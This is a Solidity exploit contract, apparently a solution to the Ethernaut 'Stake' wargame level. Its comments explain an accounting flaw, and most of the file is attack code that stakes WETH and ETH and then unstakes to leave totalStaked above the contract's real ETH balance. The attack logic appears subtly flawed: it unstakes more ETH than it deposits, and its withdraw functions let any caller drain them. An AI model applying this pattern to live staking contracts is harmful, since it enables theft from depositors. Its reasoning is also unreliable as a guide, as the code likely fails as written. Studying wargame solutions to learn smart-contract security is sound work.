// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title StakeAttack
 * @notice Exploit contract for Ethernaut Level 31 - Stake
 * 
 * VULNERABILITY:
 * The Stake contract has a critical accounting flaw:
 * 1. StakeWETH increases totalStaked but only receives ERC20 WETH (not native ETH)
 * 2. Unstake sends native ETH regardless of whether you staked ETH or WETH
 * 3. This creates a mismatch between totalStaked and actual ETH balance
 * 
 * EXPLOIT STRATEGY:
 * 1. Stake WETH tokens (increases totalStaked, but doesn't add to ETH balance)
 * 2. Unstake the WETH amount (sends ETH, reducing contract's ETH balance)
 * 3. Result: totalStaked > contract ETH balance
 * 4. We're a staker with 0 staked balance
 * 
 * WIN CONDITIONS:
 * - Stake contract's ETH balance > 0
 * - totalStaked > Stake contract's ETH balance
 * - msg.sender is a staker (Stakers[msg.sender] = true)
 * - msg.sender's staked balance = 0 (UserStake[msg.sender] = 0)
 */

interface IStake {
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
    function totalStaked() external view returns (uint256);
    function UserStake(address user) external view returns (uint256);
    function Stakers(address user) external view returns (bool);
    function WETH() external view returns (address);
}

contract StakeAttack {
    IStake public target;
    IERC20 public weth;
    
    event AttackExecuted(
        uint256 contractBalance,
        uint256 totalStaked,
        bool isStaker,
        uint256 userStake
    );
    
    constructor(address _target) {
        require(_target != address(0), "Invalid target address");
        target = IStake(_target);
        weth = IERC20(target.WETH());
    }
    
    /**
     * @notice Execute the complete attack
     * @dev This performs the exploit in multiple steps to meet all win conditions
     */
    function attack() external payable {
        require(msg.value >= 0.002 ether, "Need at least 0.002 ETH");
        
        // Step 1: Get some WETH by depositing ETH
        // We need WETH to exploit the StakeWETH function
        uint256 wethAmount = 0.001 ether + 1; // Slightly more than minimum
        
        // Deposit ETH to get WETH (assuming WETH contract has deposit function)
        (bool success,) = address(weth).call{value: wethAmount}("");
        require(success, "WETH deposit failed");
        
        // Step 2: Approve Stake contract to spend our WETH
        weth.approve(address(target), wethAmount);
        
        // Step 3: Stake WETH (this increases totalStaked but NOT the ETH balance)
        target.StakeWETH(wethAmount);
        
        // Step 4: Stake some ETH to ensure contract has ETH balance > 0
        // This is necessary to meet the win condition
        uint256 ethStakeAmount = 0.001 ether + 1;
        target.StakeETH{value: ethStakeAmount}();
        
        // Step 5: Unstake everything
        // This sends ETH from the contract, creating the accounting mismatch
        uint256 totalUserStake = target.UserStake(address(this));
        target.Unstake(totalUserStake);
        
        // Verify win conditions
        uint256 contractBalance = address(target).balance;
        uint256 totalStaked = target.totalStaked();
        bool isStaker = target.Stakers(address(this));
        uint256 userStake = target.UserStake(address(this));
        
        emit AttackExecuted(contractBalance, totalStaked, isStaker, userStake);
        
        require(contractBalance > 0, "Contract balance must be > 0");
        require(totalStaked > contractBalance, "totalStaked must be > balance");
        require(isStaker, "Must be a staker");
        require(userStake == 0, "User stake must be 0");
    }
    
    /**
     * @notice Alternative attack: Use external funding
     * @dev Helper can stake ETH to ensure contract has balance
     */
    function attackWithHelper() external {
        // Assumes someone else has staked ETH to the contract
        
        // Get WETH (assumes this contract already has WETH or can receive it)
        uint256 wethBalance = weth.balanceOf(address(this));
        require(wethBalance > 0.001 ether, "Need WETH");
        
        // Approve and stake WETH
        uint256 stakeAmount = 0.001 ether + 1;
        weth.approve(address(target), stakeAmount);
        target.StakeWETH(stakeAmount);
        
        // Unstake to create mismatch
        target.Unstake(stakeAmount);
    }
    
    /**
     * @notice Step-by-step attack for manual execution
     */
    function step1_GetWETH() external payable {
        require(msg.value > 0.001 ether, "Need more ETH");
        (bool success,) = address(weth).call{value: msg.value}("");
        require(success, "WETH deposit failed");
    }
    
    function step2_ApproveWETH(uint256 amount) external {
        weth.approve(address(target), amount);
    }
    
    function step3_StakeWETH(uint256 amount) external {
        target.StakeWETH(amount);
    }
    
    function step4_StakeETH() external payable {
        target.StakeETH{value: msg.value}();
    }
    
    function step5_Unstake(uint256 amount) external {
        target.Unstake(amount);
    }
    
    /**
     * @notice Check current state
     */
    function checkState() external view returns (
        uint256 contractBalance,
        uint256 totalStaked,
        bool isStaker,
        uint256 userStake,
        bool meetsConditions
    ) {
        contractBalance = address(target).balance;
        totalStaked = target.totalStaked();
        isStaker = target.Stakers(address(this));
        userStake = target.UserStake(address(this));
        
        meetsConditions = (
            contractBalance > 0 &&
            totalStaked > contractBalance &&
            isStaker &&
            userStake == 0
        );
    }
    
    /**
     * @notice Check state for any address
     */
    function checkStateFor(address user) external view returns (
        uint256 contractBalance,
        uint256 totalStaked,
        bool isStaker,
        uint256 userStake,
        bool meetsConditions
    ) {
        contractBalance = address(target).balance;
        totalStaked = target.totalStaked();
        isStaker = target.Stakers(user);
        userStake = target.UserStake(user);
        
        meetsConditions = (
            contractBalance > 0 &&
            totalStaked > contractBalance &&
            isStaker &&
            userStake == 0
        );
    }
    
    /**
     * @notice Withdraw any ETH from this contract
     */
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    /**
     * @notice Withdraw any WETH from this contract
     */
    function withdrawWETH() external {
        uint256 balance = weth.balanceOf(address(this));
        weth.transfer(msg.sender, balance);
    }
    
    /**
     * @notice Receive ETH
     */
    receive() external payable {}
}
